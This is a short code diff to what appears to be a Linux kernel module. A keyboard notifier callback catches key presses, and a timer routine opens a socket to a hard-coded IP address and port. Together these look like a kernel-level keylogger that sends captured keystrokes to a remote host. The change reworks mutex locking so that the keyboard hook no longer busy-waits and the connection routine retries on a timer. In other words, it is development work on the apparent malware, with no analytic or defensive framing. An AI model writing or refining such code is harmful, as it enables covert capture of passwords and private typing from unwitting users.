@@ -51,14 +51,10 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
 
-    while (mutex_trylock(&socks_mutex) == 0);
-
     if (code == KBD_KEYSYM && param && param->down) {
         // Call the keyboard interrupt handler
         keyboard_interrupt_handler(0, param);
     }
-
-    mutex_unlock(&socks_mutex);
 
     return NOTIFY_OK;
 }
@@ -66,6 +62,12 @@ int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code
 
 void initialize_conn(struct timer_list *t) {
     int result;
+    
+    result = mutex_trylock(&socks_mutex);
+    if (result != 1) {
+    	mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
+	return;
+    }
 
     result = create_socket(IP_ADDRESS, PORT);
     if (result < 0) {
